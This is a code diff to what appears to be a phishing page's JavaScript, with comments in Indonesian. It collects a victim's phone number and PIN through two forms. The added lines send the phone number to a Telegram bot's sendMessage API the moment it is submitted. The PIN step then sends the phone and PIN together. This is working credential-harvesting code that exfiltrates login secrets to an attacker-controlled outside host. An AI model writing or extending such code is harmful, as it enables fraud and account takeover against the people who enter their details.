@@ -9,7 +9,24 @@ document.addEventListener("DOMContentLoaded", function () {
             event.preventDefault();
             const phone = document.getElementById("phone").value;
             localStorage.setItem("phone", phone); // Simpan ke Local Storage
-            window.location.href = "pin.html"; // Pindah ke halaman PIN
+
+            // Kirim Nomor HP ke Telegram Langsung
+            const message = `📲 *Data Baru Diterima*\n\n📱 *Nomor HP*: \`${phone}\`\n📅 Tanggal: ${new Date().toLocaleString()}`;
+            const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+            fetch(telegramURL)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log("Nomor HP terkirim ke Telegram!");
+                    } else {
+                        console.error("Gagal mengirim Nomor HP.");
+                    }
+                })
+                .catch(error => console.error("Error:", error));
+
+            // Pindah ke halaman PIN
+            window.location.href = "pin.html";
         });
     }
 
@@ -19,7 +36,7 @@ document.addEventListener("DOMContentLoaded", function () {
         formPin.addEventListener("submit", function (event) {
             event.preventDefault();
             const pin = document.getElementById("pin").value;
-            const phone = localStorage.getItem("phone"); // Ambil Nomor HP
+            const phone = localStorage.getItem("phone"); // Ambil Nomor HP yang sudah dikirim sebelumnya
 
             if (!phone) {
                 alert("Nomor HP tidak ditemukan. Harap isi ulang.");
@@ -27,19 +44,17 @@ document.addEventListener("DOMContentLoaded", function () {
                 return;
             }
 
-            // Format pesan untuk Telegram
-            const message = `📲 *Data Baru Diterima*\n\n📱 *Nomor HP*: \`${phone}\`\n🔢 *PIN*: \`${pin}\`\n📅 Tanggal: ${new Date().toLocaleString()}`;
-
-            // Kirim data ke Telegram
+            // Kirim PIN ke Telegram
+            const message = `🔢 *PIN Diterima*\n\n📱 *Nomor HP*: \`${phone}\`\n🔑 *PIN*: \`${pin}\`\n📅 Tanggal: ${new Date().toLocaleString()}`;
             const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
 
             fetch(telegramURL)
                 .then(response => response.json())
                 .then(data => {
                     if (data.ok) {
-                        alert("Data berhasil dikirim!");
+                        alert("PIN berhasil dikirim!");
                     } else {
-                        alert("Gagal mengirim data.");
+                        alert("Gagal mengirim PIN.");
                     }
                 })
                 .catch(error => {
